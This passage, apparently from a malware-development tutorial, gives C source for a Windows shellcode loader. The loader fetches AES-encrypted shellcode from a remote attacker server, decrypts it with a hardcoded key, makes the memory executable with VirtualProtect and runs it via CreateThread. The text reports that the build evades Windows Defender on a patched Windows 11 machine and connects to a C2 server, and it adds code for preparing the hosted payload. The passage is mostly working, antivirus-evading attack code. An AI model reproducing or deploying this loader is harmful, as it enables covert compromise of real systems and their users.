            InternetCloseHandle(hInternet);
            return -1;
        }

        // keeps track of the total number of bytes read from the file.
        sSize = sSize + dwBytesRead;

        // If this is the first chunk, allocate fresh memory of dwBytesRead size.
        if (pBytes == NULL) {
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        }

        else {
            // Reallocate the pBytes to equal to the total size, i.e. sSize
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }


        // Append the temp buffer to the end of the total buffer
        PBYTE pTarget = pBytes + (sSize - dwBytesRead);
        memcpy(pTarget, pTmpBuffer, dwBytesRead);

        ZeroMemory(pTmpBuffer, dwBytesRead);

        // once the bytes size of dwBytesRead reaches less than 1024, then its the end of the fiel.
        if (dwBytesRead < 1024) {
            break;
        }

    }
    //pointer to full shellcode buffer.
    *pPayloadBytes = pBytes;

    // total size of downloaded shellcode.
    *sPayloadSize = sSize;
    return TRUE;
}

int main() {

    SIZE_T	Size = NULL;
    PBYTE	Bytes = NULL;


    // Calling the function to read the encrypted shellcode
    if (!ShellcodeFromUrl(&Bytes, &Size)) {
        return -1;
    }

    // Printing encrypted shellcode address and size of it.
    printf("[i] Bytes : 0x%p \n", Bytes);
    printf("[i] Size  : %ld \n", Size);

    // Printing the shellcode into bytes.
    for (int i = 0; i < Size; i++) {
        if (i % 16 == 0)
            printf("\n\t");

        printf("%0.2X ", Bytes[i]);
    }
    printf("\n\n");

    // Printing the shellcode into Hex Format.
    printf("Hex Format\n");
    for (int i = 0; i < Size; i++) {
        if (i % 16 == 0) {
            printf("\n\t");
        }
        if (i < Size - 1) {
            printf("0x%0.2X, ", Bytes[i]);
        }
        else {
            printf("0x%0.2X ", Bytes[i]);
        }
    }
    printf("\n\n\n");

    // Initializing the key and IV needed for the decryption
    PVOID	pPlaintext = NULL;
    DWORD	dwPlainSize = NULL;
    unsigned char AesKey[] = {
        0x82, 0xD7, 0xD0, 0xAA, 0xB9, 0xE9, 0xB1, 0xFC, 0x27, 0xB1, 0x5B, 0x36, 0x0E, 0x7F, 0xAF, 0x48,
        0xEE, 0xDD, 0xD9, 0x3F, 0xEE, 0x69, 0xD1, 0xBD, 0x7D, 0xE4, 0x28, 0xA6, 0x39, 0x86, 0x01, 0x1D };
    unsigned char AesIv[] = {
            0xEC, 0x6C, 0xF0, 0x8E, 0xA6, 0x37, 0xEA, 0xCE, 0x98, 0x8B, 0xA8, 0xA0, 0x3B, 0x95, 0xF8, 0xAC };
    
    // Calling the decryption function
    if (!SimpleDecryption(Bytes, Size, AesKey, AesIv, &pPlaintext, &dwPlainSize)) {
        printf("Decryption exited with code: %d \n", GetLastError());
        return -1;
    }

    // Printing the decypted shellcode
    printf("\n[>] decrypted shellcode:\n");
    for (int i = 0; i  < dwPlainSize; i++) {
        printf("0x%02X, ", ((unsigned char*)pPlaintext)[i]);
    }
    printf("\n");

    // Initiating the shellcode injection
    printf("[#] Press <Enter> To Run ... ");
    getchar();

    PVOID pShellcodeAddress = VirtualAlloc(NULL, dwPlainSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();

    // Copying the payload to the allocated memory
    memcpy(pShellcodeAddress, pPlaintext, dwPlainSize);
   
    // Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
    memset(pPlaintext, '\0', dwPlainSize);

    DWORD dwOldProtection = NULL;
    
    // Setting memory permissions at pShellcodeAddress to be executable
    if (!VirtualProtect(pShellcodeAddress, dwPlainSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Executing the shellcode
    printf("[#] Press <Enter> To Run ... ");
    getchar();

    // Running the shellcode as a new thread's entry 
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Freeing pDeobfuscatedPayload
    HeapFree(GetProcessHeap(), 0, pPlaintext);
    printf("[#] Press <Enter> To Quit ... ");
    getchar();
}
``` 

Build the malicious executable using Visual Studio.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/aes-encryption-4.png">

Using ThreatCheck to verify if it identifies any signatures based on the Windows Defender. Observe that the threatcheck has been used against the hosted payload as well.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/aes-encryption-5.png">

Execute the payload on the completely patched Windows 11 Pro 22H2 machine and observe that were are able to successfully bypass Windows Defender and Real Time Protection and eventually were able to get the beacon on the C2 server.
<br>
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/aes-encryption-6.gif">

## Important
Note that during the payload encryption phase, the payload is encrypted using HellShell which provides the array of encrypted data. We need to convert that array into a binary file. We can write a simple code which opens a file called **encrypted_shellcode.bin** in binary write mode and writes the entire contents of the AES ciphertext to the file using **fwrite**. This file is the actual file that needs to be hosted on the attacker server.    
```c
#include <stdio.h>

unsigned char AesCipherText[] = {
        0x53, 0x73, 0x2E,...[snip]..., 0xD2, 0xBC };

int main() {
    FILE* binaryFile;

    // Opens the file in binary write mode
    fopen_s(&binaryFile, "encrypted_payload.bin", "wb");
      
    // Write the whole array to the binary file
    fwrite(AesCipherText, sizeof(unsigned char), sizeof(AesCipherText) / sizeof(unsigned char), binaryFile);

    // Close the file
    fclose(binaryFile);

    return 0;
}
```

Run the above code to generate the binary file and host it into your attacker server.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/aes-encryption-7.png">

#### References
- [https://maldevacademy.com/](https://maldevacademy.com/)
- [https://www.youtube.com/watch?v=O4xNJsjtN6E](https://www.youtube.com/watch?v=O4xNJsjtN6E)
- [https://www.youtube.com/watch?v=3MPkc-PFSRI](https://www.youtube.com/watch?v=3MPkc-PFSRI)
- [https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/)
- [https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw)
- [https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw)
- [https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)